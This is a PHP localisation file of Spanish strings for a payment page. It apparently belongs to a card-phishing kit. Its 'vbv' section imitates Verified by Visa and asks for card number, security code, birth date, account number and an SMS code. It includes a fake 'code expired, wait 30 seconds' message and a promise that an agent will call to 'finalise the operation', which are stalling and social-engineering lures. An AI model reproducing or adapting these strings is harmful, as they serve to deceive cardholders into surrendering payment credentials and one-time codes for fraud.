<?php
$language = array(
    'title' => array(
        '1' => 'Pago',
    ),
	
    'secure_text' => array(
        '1' => 'Con tecnología SSL',
        '2' => 'sus datos personales siempre están protegidos.',
    ),
	
    'card_title' => array(
        '1' => 'Acreditar mi tarjeta',
    ),

    'order_btn' => array(
        '1' => 'Pago',
        '2' => 'Pago seguro por SSL',
    ),

    'biling' => array(
        '1' => 'Sus datos de contacto',
            '2' => 'Nombre',
            '3' => 'Apellido',
            '4' => 'Correo electrónico',
    ),
    
	'details_submit' => array(
        '1' => 'Siguiente',
    ),

    'paiement_iframe'   => array(
        'details_title' => array(
            '1' => '1 pagos',
            '2' => 'Información de pago',
            '3' => 'Costo',
            '4' => 'Detalle',
            '5' => 'Subtotal',
            '6' => 'IVA',
            '7' => 'Total',
            '8' => 'Ingrese su información de pago',
        ),
        'formpayment' => array(
			'1' => 'Número de teléfono',
			'2' => 'Número de tarjeta',
			'3' => 'Fecha de caducidad',
			'4' => 'código de seguridad',
			'5' => 'Validar',
		),
    ),

    'vbv' => array(
        'lines' => array(
            '1' => ' ',
            '2' => 'ayuda a proteger tu',
            '3' => 'tarjeta contra uso no autorizado en línea, sin costo adicional. Usar',
            '4' => 'Confirme el código recibido por SMS para recibir el pago.',
            '5' => 'luego haga clic en validar',
            '6' => 'Nota: si no recibe un código, uno de nuestros agentes lo llamará para finalizar la operación',
        ),
        '1'     => 'Comerciante',
        '2'     => 'Cantidad',
        '3'     => 'Fecha',
        '4'     => 'Número de tarjeta',
        '5'     => 'Tipo de tarjeta',
        '6'     => 'Nombre tal como está impreso en la tarjeta',
        '7'     => 'Fecha de nacimiento del titular principal de la tarjeta',
        '8'     => '(DD/MM/AAAA)',
        '9'     => 'Número de teléfono personal',
        '10'    => 'Número de cuenta',
        '11'    => 'Validar',
        '12'    => '"Código caducado, espere a que se le envíe un nuevo código en 30 segundos"',
        '13'    => '"Inválido"',
    ),

    'footer_top'   => array(
        '1' => 'Contáctenos',
        '2' => 'Términos de ventas',
            '3' => 'Tienda creada con',
            '4' => 'Política de seguridad',
    ),
    
);

?>